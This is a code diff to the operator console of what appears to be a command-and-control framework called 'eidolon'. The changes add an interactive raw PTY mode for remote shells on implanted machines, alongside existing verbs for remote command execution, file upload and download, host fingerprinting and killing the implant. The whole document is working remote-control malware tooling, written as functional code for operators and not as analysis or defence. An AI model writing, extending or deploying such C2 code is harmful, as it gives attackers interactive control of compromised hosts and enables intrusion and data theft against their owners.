@@ -42,9 +42,14 @@ OPERATOR FLOW:
 
 INNER-SHELL VERBS:
   shell <cmd>        run a command, output streamed back (client shell)
-  pty                open an INTERACTIVE shell on the implant (bash -i on a
-                     real PTY — go implants on linux); from then on everything
-                     you type goes straight into the pty until you type .q
+  pty                open an INTERACTIVE shell on the implant (go implants
+                     on linux) — the local terminal goes RAW and every byte
+                     you type is streamed 1:1 into the remote pty: remote
+                     echo, history, Tab completion, Ctrl+C, full-screen apps
+                     (vim/htop) all work; the pty follows YOUR terminal size
+                     and live-resizes (SIGWINCH). Ctrl+] drops back to line
+                     mode (the remote shell keeps running); .q leaves pty
+                     mode entirely. `pty` again opens a fresh pty.
   sysinfo            ask the implant for a fingerprint blob
   upload <l> <r>     send a local file (realpath-contained, <= 4 MiB)
   download <r> <l>   fetch a remote file to <l> (0o600)
@@ -56,11 +61,15 @@ import base64
 import datetime
 import ipaddress
 import json
+import codecs
 import os
 import posixpath
 import secrets
+import select
+import signal
 import ssl
 import sys
+import threading
 
 from eidolon.utils import ok, err, info, warn
 
@@ -241,9 +250,15 @@ class _SessionCtx:
         self.seq = 0
         self.pending: dict = {}          # req id -> {"verb": .., "local": ..}
         self.pty = False                 # true while lines flow into a pty
+        self.pty_evt = None              # set when the pty_open ack lands
+        self.pty_dec = codecs.getincrementaldecoder("utf-8")("replace")
 
     def send_cmd(self, obj):
-        self.queue.put_nowait(json.dumps(obj))
+        line = json.dumps(obj)
+        try:
+            self.loop.call_soon_threadsafe(self.queue.put_nowait, line)
+        except RuntimeError:
+            pass                       # listener loop already closed
 
 
 async def _writer(ctx: _SessionCtx):
@@ -258,6 +273,69 @@ async def _writer(ctx: _SessionCtx):
 def _complete(text, line):
     return [w for w in ("help", "shell", "pty", "sysinfo", "upload", "download", "die")
             if w.startswith(text)]
+
+
+def _pty_send(ctx, data):
+    if data:
+        ctx.send_cmd({"cmd": "pty_in",
+                      "data": base64.b64encode(data).decode()})
+
+
+def _pty_raw_mode(ctx):
+    """Take the local terminal raw and stream bytes 1:1 into the remote
+    pty — ssh-style. Remote echo / completion / Ctrl+C / full-screen apps
+    all behave; Ctrl+] (0x1d) drops back to line mode with the remote
+    shell still running. Falls back to plain line forwarding when there
+    is no local tty."""
+    if not os.isatty(0):
+        info(f"[{ctx.sess.sid}] no local tty — line mode (each line you "
+             "type still reaches the pty; .q leaves)")
+        return
+    try:
+        import termios
+        import tty
+        old = termios.tcgetattr(0)
+    except Exception as e:
+        info(f"[{ctx.sess.sid}] raw mode unavailable ({e}) — line mode")
+        return
+    tty.setraw(0, termios.TCSANOW)
+    prev_winch = signal.getsignal(signal.SIGWINCH)
+
+    def _resized(signum, frame):
+        try:
+            sz = os.get_terminal_size(0)
+            ctx.send_cmd({"cmd": "pty_sz", "arg": f"{sz.columns},{sz.lines}"})
+        except Exception:
+            pass
+
+    try:
+        signal.signal(signal.SIGWINCH, _resized)
+    except ValueError:
+        prev_winch = None               # not the main thread — skip resize
+    info(f"[{ctx.sess.sid}] raw pty live — Ctrl+] back to verbs, remote "
+         "shell keeps running")
+    try:
+        while ctx.pty:
+            r, _, _ = select.select([0], [], [], 0.25)
+            if r:
+                data = os.read(0, 4096)
+                if not data:
+                    break
+                idx = data.find(b"\x1d")
+                if idx >= 0:
+                    _pty_send(ctx, data[:idx])
+                    break
+                _pty_send(ctx, data)
+    finally:
+        termios.tcsetattr(0, termios.TCSADRAIN, old)
+        if prev_winch is not None:
+            try:
+                signal.signal(signal.SIGWINCH, prev_winch)
+            except ValueError:
+                pass
+    if ctx.pty:
+        info(f"[{ctx.sess.sid}] raw off — line mode (remote shell still "
+             "live); .q leaves pty mode")
 
 
 def _enter(sh, sctx, on_exit_note):
@@ -297,7 +375,20 @@ def _on_operator_line(ctx, line):
     elif verb == "pty":
         ctx.seq += 1
         ctx.pending[ctx.seq] = {"verb": "pty"}
-        ctx.send_cmd({"id": ctx.seq, "cmd": "pty_open", "arg": "120,32"})
+        ctx.pty_evt = threading.Event()
+        try:
+            sz = os.get_terminal_size(sys.stdout.fileno())
+            arg = f"{sz.columns},{sz.lines}"
+        except (OSError, ValueError):
+            arg = "120,32"
+        ctx.send_cmd({"id": ctx.seq, "cmd": "pty_open", "arg": arg})
+        if not ctx.pty_evt.wait(timeout=15):
+            ctx.pty = False
+            warn(f"[{ctx.sess.sid}] no pty ack in 15s — implant may not "
+                 "support it (rebuild + redeploy the go implant)")
+        ctx.pty_evt = None
+        if ctx.pty:
+            _pty_raw_mode(ctx)
     elif verb == "upload" and len(args) >= 2:
         local, remote = args[0], args[1]
         try:
@@ -339,8 +430,17 @@ def _on_frame(ctx, raw):
             for ln in out.splitlines():
                 info(f"[{ctx.sess.sid}] {ln}")
         elif pend and pend["verb"] == "pty":
-            ctx.pty = True
-            info(f"[{ctx.sess.sid}] {out}")
+            evt = ctx.pty_evt
+            ctx.pty_evt = None
+            if out.startswith("pty up"):
+                ctx.pty = True
+                info(f"[{ctx.sess.sid}] {out}")
+            else:
+                ctx.pty = False          # stub/nim rejection — stay in verbs
+                for ln in out.splitlines() or ["(no output)"]:
+                    info(f"[{ctx.sess.sid}] {ln}")
+            if evt:
+                evt.set()
         else:
             for ln in out.splitlines() or ["(no output)"]:
                 info(f"[{ctx.sess.sid}] {ln}")
@@ -350,7 +450,7 @@ def _on_frame(ctx, raw):
         except Exception:
             data = b""
         if data:
-            sys.stdout.write(data.decode(errors="replace"))
+            sys.stdout.write(ctx.pty_dec.decode(data))
             sys.stdout.flush()
     elif rtype == "pty_exit":
         ctx.pty = False
@@ -428,6 +528,8 @@ async def handle(ws):
     finally:
         writer.cancel()
         ctx.pty = False
+        if ctx.pty_evt:
+            ctx.pty_evt.set()
         EIDOLON_SHELL._c2_on_event(("down", sess))
         info(f"implant gone: {sess.sid} ({peer})")
 
